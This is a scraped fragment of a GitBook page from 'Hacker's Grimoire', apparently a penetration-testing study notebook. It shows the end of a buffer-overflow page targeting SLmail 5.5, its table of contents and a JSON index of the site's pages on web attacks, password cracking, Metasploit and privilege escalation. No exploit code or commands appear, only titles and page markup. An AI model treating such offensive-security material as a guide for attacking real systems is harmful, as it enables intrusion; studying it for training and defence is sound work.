data-key="8230daa7143b4c81b6ea6ca0ea5bd5e6"><span data-key="6e1980b3160842ceaeea1c3b1d8a433b"><span data-offset-key="6e1980b3160842ceaeea1c3b1d8a433b:0">Ability FTP 2.34 stack-based buffer overflow</span></span></a><span data-key="55f509de2ad147e38c91de2cbef9019d"><span data-offset-key="55f509de2ad147e38c91de2cbef9019d:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li></ul><p class="blockParagraph-544a408c" data-key="680c64574d304bd8aa003030d7a4d0d9"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="c6e84f02e37c49298fb764fe21ccce5a"><span data-offset-key="c6e84f02e37c49298fb764fe21ccce5a:0"><span data-slate-zero-width="n">​</span></span></span></span></p><p class="blockParagraph-544a408c" data-key="016f9c8a3d9349ef85227d0af72eb65c"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="c1c5b3390ad146b398b02293d8e6d1b3"><span data-offset-key="c1c5b3390ad146b398b02293d8e6d1b3:0">

</span></span></span></p></div></div></div></div><div class="reset-3c756112--pageFooter-f1d5e2b0"><div class="reset-3c756112"><div class="reset-3c756112--navPagesLinks-67bea901"><a class="reset-3c756112--card-6570f064--whiteCard-fff091a4--cardPrevious-56a5e674" href="/hackers-grimoire/exploitation/metasploit"><div class="reset-3c756112--cardIcon-5b647d22"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></g></svg></div><div class="reset-3c756112--cardBody-25dca3b1--cardPreviousBody-79f02c06"><div class="reset-3c756112--cardHint-2c5d8183"><span class="text-4505230f--TextH200-a3425406--textContentFamily-49a318e1">Previous</span></div><div class="reset-3c756112--cardTitle-32aa092e"><span class="text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1">Metasploit</span></div></div></a><a class="reset-3c756112--card-6570f064--whiteCard-fff091a4--cardNext-19241c42" href="/hackers-grimoire/post-exploitation"><div class="reset-3c756112--cardBody-25dca3b1"><div class="reset-3c756112--cardHint-2c5d8183"><span class="text-4505230f--TextH200-a3425406--textContentFamily-49a318e1">Next</span></div><div class="reset-3c756112--cardTitle-32aa092e"><span class="text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1">Post exploitation</span></div></div><div class="reset-3c756112--cardIcon-5b647d22"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></g></svg></div></a></div></div><div class="reset-3c756112--pageFooterColumns-ef8f347e"><div class="reset-3c756112--pageFooterSummary-12074aff"><div class="reset-3c756112--pageChangesSummary-08821678"><div class="reset-3c756112--pageContributors-5c59582e"><div class="reset-3c756112--ownerAvatarList-696792ce"><div aria-label="vulpecula" class="reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802"><div class="reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a--circle-6c5acd10" role="presentation"><img class="image-67b14f24--avatar-1c1d03ec" src="https://avatars3.githubusercontent.com/u/6218175?v=4"/><div class="reset-3c756112--innerShadow-7a3a8651"></div></div></div></div></div><div class="reset-3c756112--pageEditedDate-b805c39a"><span class="text-4505230f--TextH200-a3425406--textContentFamily-49a318e1">Last updated <span>1 year ago</span></span></div></div></div></div></div></div><div class="reset-3c756112--pageSide-ad9fed26"><div class="reset-3c756112--stickyContainer-2bed3a82"><div style="padding-bottom:0" class="reset-3c756112"></div><div class="reset-3c756112--tocWrapper-506ea24c"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114"><div class="reset-3c756112--pageSideSection-542f1fd5"><div class="reset-3c756112--menu-5b8a7448--pageToc-16c35922--pageTocLive-542f1fd5"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496"><div class="reset-3c756112--menuHeader-342906de--menuHeaderLight-2c5d8183"><div class="reset-3c756112--menuHeaderIcon-0c3ed569"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="21" y1="10" x2="7" y2="10"></line><line x1="21" y1="6" x2="3" y2="6"></line><line x1="21" y1="14" x2="3" y2="14"></line><line x1="21" y1="18" x2="7" y2="18"></line></g></svg></div><div class="reset-3c756112"><span class="text-4505230f--InfoH100-1e92e1d1--textContentFamily-49a318e1">Contents</span></div></div><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#setup"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1">Setup</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#slmail-5-5"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1">SLmail 5.5</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#install-slmail"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Install SLmail</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#find-the-instruction-pointer"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Find the instruction pointer</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#redirect-execution-of-the-program"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Redirect execution of the program</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#make-shellcode"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Make shellcode</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#assemble-the-exploit"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Assemble the exploit</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="#further-reading"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Further reading</span></span></div></a></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
            <div id="__GITBOOK__ROOT__CLIENT__" style="display: none;"></div>
            <script>
            window.GITBOOK_STATE = {"state":{"database":{"orgs/-LM4E0-lZuZP0jCAcHqW/infos":{"kind":"org","data":{"kind":"org","uid":"-LM4E0-lZuZP0jCAcHqW","name":"vulp3cula","createdAt":1536612345582,"createdBy":"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92","logoURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/orgs%2F-LM4E0-lZuZP0jCAcHqW%2Favatar.png?generation=1536612375219987\u0026alt=media","baseDomain":"vulp3cula","type":null,"spacesPermission":{},"customDomain":null,"ssoSignInLabel":null,"defaultSpace":null,"lockReason":null,"useCase":null,"usageStatuses":{"members":"below","privateSpaces":"below","publicSpaces":"reached"},"hideBranding":false}},"spaces/-LMNRaGfniDGOexfu2Y6/infos":{"kind":"space","data":{"uid":"-LMNRaGfniDGOexfu2Y6","name":"Hacker's Grimoire","createdAt":1536873875162,"ownerID":"-LM4E0-lZuZP0jCAcHqW","isPrivate":false,"isUnlisted":false,"secretToken":null,"baseName":"hackers-grimoire","createdBy":"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92","logoURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/spaces%2F-LMNRaGfniDGOexfu2Y6%2Favatar.png?generation=1545335358292957\u0026alt=media","fullLogoURL":null,"emoji":null,"colorPrimary":"#bf272e","headerTheme":"light","font":null,"locale":null,"primaryRevision":"-M0JikqnfXtUduSDb0QQ","edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1546896891400,"updatedAt":1581969606271,"count":38}},"algoliaAPIKey":"ZjhkMTg2ZGNiZmYxOGE2Njc0ZTQ0ZGIxZWJlYTVhM2Q4ZGNlOTM2OWZlMTNmYzRmNDliMDVkNTAxYjFmMDM5YmZpbHRlcnM9LUxNTlJhR2ZuaURHT2V4ZnUyWTY=","customDomain":null,"links":[],"hasGitHubSync":true,"editOnGitHub":null,"googleAnalyticsID":"UA-131120979-1","intercomID":null,"hasPageRating":true,"hasPDFExport":false,"indexedRevision":"-M0JikqnfXtUduSDb0QQ"}},"spaces/-LMNRaGfniDGOexfu2Y6/revisions/-M0JikqnfXtUduSDb0QQ":{"kind":"revision","data":{"uid":"-M0JikqnfXtUduSDb0QQ","message":"","createdAt":1581969606271,"createdBy":"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92","parents":["-M0Ji3JWiCihAdMN70bg"],"content":{"primaryVersion":"master","versions":{"master":{"index":0,"ref":"master","title":"1.0.0","github":{"repoID":"vulp3cula/hackers-grimoire","sha":"f0fcb677c7aee1776eb6505e62254bb974b1401e","ref":null,"message":"GitBook: [master] one page modified","isGitBookBot":true},"locale":null,"entryPage":"-LMNRaGgZBqE-jU_jubo","pages":{"-LMNRaGgZBqE-jU_jubo":{"uid":"-LMNRaGgZBqE-jU_jubo","kind":"document","title":"Hacker's Grimoire","path":"master","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LMxc7hnk-ufH_wu75zF%2Fmaster%2F-LMNRaGgZBqE-jU_jubo%2Fdocument.json?alt=media\u0026token=268bf4fc-9ba7-462a-8986-296f1fa1d7d8","createdAt":1536934700140,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1537558922413,"updatedAt":1537558922413,"count":1}},"github":{"sha":"d41f3c6b5bb28a0cbdb668686a4243c0a17cf572","filePath":"README.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-LMNZjlG6x1eBVZzIVJt","-LMNgYRtF7Zqa-MsntMj","-LMNaX4Ct0vnlSSvP6hv","-LNkzxGwJYxKw-wc6I3z","-LO-XNCqRqXP8qFY4rTS","-LMxqx4puMNL-q-mc1EM"]},"-LMNZjlG6x1eBVZzIVJt":{"uid":"-LMNZjlG6x1eBVZzIVJt","kind":"document","title":"Reconnaissance","path":"recon","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LMxZTOoJ-FF6zONomKe%2Fmaster%2F-LMNZjlG6x1eBVZzIVJt%2Fdocument.json?alt=media\u0026token=29c1de35-a01e-47d5-8b3a-ae9bff743379","createdAt":1536936836178,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1537557529376,"updatedAt":1537557529376,"count":1}},"github":{"sha":"918f604b7edc3d147ad58a4327879af97cf6b123","filePath":"recon/README.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-LMNZGlC-CLinSVrYxVm","-LMNZGlDx1ADSZ71OFYv"]},"-LMNZGlC-CLinSVrYxVm":{"uid":"-LMNZGlC-CLinSVrYxVm","kind":"document","title":"Passive information gathering","path":"passive-information-gathering","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LNLgTESL8QIR6dlnppf%2Fmaster%2F-LMNZGlC-CLinSVrYxVm%2Fdocument.json?alt=media\u0026token=aaea1096-dab5-48d6-bfaf-3404402ee8c2","createdAt":1536936713293,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1537979231639,"updatedAt":1537979231639,"count":1}},"github":{"sha":"35f6d3fe937d10010d38dbd0e642fde5c10556f3","filePath":"recon/passive-information-gathering.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMNZGlDx1ADSZ71OFYv":{"uid":"-LMNZGlDx1ADSZ71OFYv","kind":"document","title":"Active information gathering","path":"active-information-gathering","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LbPPgzoiVkCHkUUgf5E%2Fmaster%2F-LMNZGlDx1ADSZ71OFYv%2Fdocument.json?alt=media\u0026token=05244ca9-866b-46a0-afed-45fc6f733632","createdAt":1536936713294,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1541106394085,"updatedAt":1554147799624,"count":2}},"github":{"sha":"d53c560d0b02b058d910ddbee91b16975e1b2298","filePath":"recon/active-information-gathering.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMNgYRtF7Zqa-MsntMj":{"uid":"-LMNgYRtF7Zqa-MsntMj","kind":"document","title":"Exploitation","path":"exploitation","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LMNghZ-VNcHu7t3HQPo%2Fmaster%2F-LMNgYRtF7Zqa-MsntMj%2Fdocument.json?generation=1536938926149193\u0026alt=media","createdAt":1536938882870,"edits":{},"github":{"sha":"ccac822e510aeacf7734570ea6ddf2752acec93a","filePath":"exploitation/README.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-LMhRdBsCn1oUou88cdG","-LOZIC52Hh2FwtoYAH4w","-LMNh2eBRvApJDtFEgdi","-LQ4Z8jIfTwS0wO0tdv1","-LT8Ks-3SRru8S9Qhb0b"]},"-LMhRdBsCn1oUou88cdG":{"uid":"-LMhRdBsCn1oUou88cdG","kind":"document","title":"Web application attacks","path":"web-application","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LjvfuLFDrDIzJ7S2LSa%2Fmaster%2F-LMhRdBsCn1oUou88cdG%2Fdocument.json?alt=media\u0026token=86b80029-5c08-4fc1-8287-dd1b9a89260a","createdAt":1537287033654,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1562863686658,"updatedAt":1563295790727,"count":2}},"github":{"sha":"8706e6adb8c6b933b845d543cf62c0fc6d79db18","filePath":"exploitation/web-application/README.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-LMhRdBtONhUxwJVUa4i","-LMhRdBuYK0oLqKQTx4n","-LMiG0SZo6D13TTBuoj6","-LjWxPDavkM2iMigQHQa","-LvLgT2U_V61vBvmttkZ","-LMiStASr4UjYYM7TMRL","-LMcwJQC5JIxDglqyLQZ"]},"-LMhRdBtONhUxwJVUa4i":{"uid":"-LMhRdBtONhUxwJVUa4i","kind":"document","title":"Local and remote file inclusion","path":"lfi-rfi","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LPXFF6xdS23mYGxWEaK%2Fmaster%2F-LMhRdBtONhUxwJVUa4i%2Fdocument.json?alt=media\u0026token=151dd8e4-f610-42e6-a454-eb34637eaa37","createdAt":1537287033654,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1540320523900,"updatedAt":1540320523900,"count":1}},"github":{"sha":"e2ba1b991ee928e52d2e0b9019b27aaf10ec8e78","filePath":"exploitation/web-application/lfi-rfi.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMhRdBuYK0oLqKQTx4n":{"uid":"-LMhRdBuYK0oLqKQTx4n","kind":"document","title":"File upload bypass","path":"file-upload-bypass","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LRn8FIUBO2URgXMxInl%2Fmaster%2F-LMhRdBuYK0oLqKQTx4n%2Fdocument.json?alt=media\u0026token=36eec788-a81d-4625-b49f-23f3d7e3ea32","createdAt":1537287033655,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1542751422632,"updatedAt":1542751422632,"count":1}},"github":{"sha":"5ec192cdbc6d63ace05a3810eefda4725f9575ad","filePath":"exploitation/web-application/file-upload-bypass.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMiG0SZo6D13TTBuoj6":{"uid":"-LMiG0SZo6D13TTBuoj6","kind":"document","title":"Cross-site scripting","path":"xss","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-Ljv_zYbWNH2NfDVgcXq%2Fmaster%2F-LMiG0SZo6D13TTBuoj6%2Fdocument.json?alt=media\u0026token=462abeb5-1b76-4448-b06c-abf4533a46b5","createdAt":1537300764514,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1537564617031,"updatedAt":1563294401589,"count":6}},"github":{"sha":"583534fdd9a2bb9a413279e1526160cafe780981","filePath":"exploitation/web-application/xss.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LjWxPDavkM2iMigQHQa":{"uid":"-LjWxPDavkM2iMigQHQa","kind":"document","title":"Cross-site request forgery","path":"csrf","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-M0JikqnfXtUduSDb0QQ%2Fmaster%2F-LjWxPDavkM2iMigQHQa%2Fdocument.json?alt=media\u0026token=322adfe2-d0ce-40b7-8921-8987cff5e685","createdAt":1562864100260,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1562864101594,"updatedAt":1581969604889,"count":7}},"github":{"sha":"f7366f542472e3a5334e06d321f07baa3275a774","filePath":"exploitation/web-application/csrf.md"},"stats":{"words":429,"images":0,"codeLines":13,"revisions":0},"pages":null},"-LvLgT2U_V61vBvmttkZ":{"uid":"-LvLgT2U_V61vBvmttkZ","kind":"document","title":"Server-side request forgery","path":"ssrf","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LvkVKk2mbwHQCTYqcRw%2Fmaster%2F-LvLgT2U_V61vBvmttkZ%2Fdocument.json?alt=media\u0026token=6fea808f-bccb-489b-aebb-aaf7dcb61ece","createdAt":1575560011992,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1575560022040,"updatedAt":1575998816517,"count":16}},"github":{"sha":"03935cc6be55722e75b133042afcb6b2efd40418","filePath":"exploitation/web-application/ssrf.md"},"stats":{"words":452,"images":0,"codeLines":36,"revisions":16},"pages":null},"-LMiStASr4UjYYM7TMRL":{"uid":"-LMiStASr4UjYYM7TMRL","kind":"document","title":"SQL injection","path":"sql-injection","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LvgW-eF0ckVWGW89GpR%2Fmaster%2F-LMiStASr4UjYYM7TMRL%2Fdocument.json?alt=media\u0026token=5fd0d6a7-8c42-4ea0-9dca-22fdd3363f29","createdAt":1537304138455,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1540414490364,"updatedAt":1575926168579,"count":3}},"github":{"sha":"8ab8a348f4494e979eedc4eb35bf93c7556d497c","filePath":"exploitation/web-application/sql-injection.md"},"stats":{"words":326,"images":0,"codeLines":51,"revisions":2},"pages":null},"-LMcwJQC5JIxDglqyLQZ":{"uid":"-LMcwJQC5JIxDglqyLQZ","kind":"document","title":"Remote code execution","path":"rce","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LvkUN2nyk2GqaiFb41U%2Fmaster%2F-LMcwJQC5JIxDglqyLQZ%2Fdocument.json?alt=media\u0026token=e3acbd61-5e99-4824-b0b0-c0d2edba4423","createdAt":1537211451082,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1540921358720,"updatedAt":1575993037018,"count":3}},"github":{"sha":"48233b88c30811af10a82a5dd1a45271b457161d","filePath":"exploitation/web-application/rce.md"},"stats":{"words":911,"images":0,"codeLines":34,"revisions":1},"pages":null},"-LOZIC52Hh2FwtoYAH4w":{"uid":"-LOZIC52Hh2FwtoYAH4w","kind":"document","title":"Working with exploits","path":"working-with-exploits","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LQ5i77BBBrJ9PqR-IRV%2Fmaster%2F-LOZIC52Hh2FwtoYAH4w%2Fdocument.json?alt=media\u0026token=5f77fee2-6ad1-41c0-990c-5708c22cfa03","createdAt":1539281047932,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1540932281615,"updatedAt":1540932281615,"count":1}},"github":{"sha":"f7768a31ac766520dc27d121aaef4d81b2b98592","filePath":"exploitation/working-with-exploits.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMNh2eBRvApJDtFEgdi":{"uid":"-LMNh2eBRvApJDtFEgdi","kind":"document","title":"Password cracking","path":"password-cracking","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-Ljc-HkyPu-Ve_q5tWCR%2Fmaster%2F-LMNh2eBRvApJDtFEgdi%2Fdocument.json?alt=media\u0026token=1ddbdc6a-b192-485a-ae71-e7481e2e8e4b","createdAt":1536939014793,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1538687794288,"updatedAt":1562965535473,"count":4}},"github":{"sha":"46f2d64a74b2e58d2315399926a58082ba1e5a74","filePath":"exploitation/password-cracking.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LQ4Z8jIfTwS0wO0tdv1":{"uid":"-LQ4Z8jIfTwS0wO0tdv1","kind":"document","title":"Metasploit","path":"metasploit","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-L_mXqYN0TqxoB4VrONB%2Fmaster%2F-LQ4Z8jIfTwS0wO0tdv1%2Fdocument.json?alt=media\u0026token=175b2ef7-4975-4ded-9ecb-1077257432df","createdAt":1540912880587,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1546889161915,"updatedAt":1552404976425,"count":3}},"github":{"sha":"64a1692b936df4ede9aea2e0e593f237656db4e7","filePath":"exploitation/metasploit.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LT8Ks-3SRru8S9Qhb0b":{"uid":"-LT8Ks-3SRru8S9Qhb0b","kind":"document","title":"Buffer overflow","path":"buffer-overflow","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LTyDQVL43tYdAzVAO4a%2Fmaster%2F-LT8Ks-3SRru8S9Qhb0b%2Fdocument.json?alt=media\u0026token=aa4a343a-b458-4a9e-aa3d-fbbb606c6e46","createdAt":1544197472255,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1545084731560,"updatedAt":1545084731560,"count":1}},"github":{"sha":"d5abbf2155e6265ecc50bbef597d1efe932aeca3","filePath":"exploitation/buffer-overflow.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMNaX4Ct0vnlSSvP6hv":{"uid":"-LMNaX4Ct0vnlSSvP6hv","kind":"document","title":"Post exploitation","path":"post-exploitation","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LMNacJztLGzS-WZUPL2%2Fmaster%2F-LMNaX4Ct0vnlSSvP6hv%2Fdocument.json?generation=1536937356588486\u0026alt=media","createdAt":1536937304395,"edits":{},"github":{"sha":"572d3bf8ad86f03509b5e4d5909db9e38c821163","filePath":"post-exploitation/README.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-LMNb2TdqZfKlPlwaBtA","-LMNfyqQfzPaRKrVyXQm"]},"-LMNb2TdqZfKlPlwaBtA":{"uid":"-LMNb2TdqZfKlPlwaBtA","kind":"document","title":"Privilege escalation: Linux","path":"privesc-linux","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LbckU-RLBVcRvq8150I%2Fmaster%2F-LMNb2TdqZfKlPlwaBtA%2Fdocument.json?alt=media\u0026token=87599cee-af76-46a6-979f-0bcc076bc79c","createdAt":1536937441192,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1539285128540,"updatedAt":1554388309288,"count":6}},"github":{"sha":"a43d516eedf2bbb2858d40663dd31bfdb56d8836","filePath":"post-exploitation/privesc-linux.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMNfyqQfzPaRKrVyXQm":{"uid":"-LMNfyqQfzPaRKrVyXQm","kind":"document","title":"Privilege escalation: Windows","path":"privesc-windows","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LVdlujPjUOKS0QD3-bc%2Fmaster%2F-LMNfyqQfzPaRKrVyXQm%2Fdocument.json?alt=media\u0026token=31b2241c-1660-4205-aa33-7aaa0101571e","createdAt":1536938732954,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1546889187353,"updatedAt":1546889187353,"count":1}},"github":{"sha":"833106091dfa7833fef5310c5d117e82f6bdc303","filePath":"post-exploitation/privesc-windows.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LNkzxGwJYxKw-wc6I3z":{"uid":"-LNkzxGwJYxKw-wc6I3z","kind":"document","title":"Linux basics","path":"linux-basics","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-La1uy3CJZavgJDPezKR%2Fmaster%2F-LNkzxGwJYxKw-wc6I3z%2Fdocument.json?alt=media\u0026token=5bf308f6-7827-4f8c-91de-4fea529f15fe","createdAt":1538420364411,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1539106908758,"updatedAt":1552679706745,"count":3}},"github":{"sha":"5a2dcb5c2a3a82e8cc8af353ba04f4c395790100","filePath":"linux-basics.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LO-XNCqRqXP8qFY4rTS":{"uid":"-LO-XNCqRqXP8qFY4rTS","kind":"document","title":"Windows 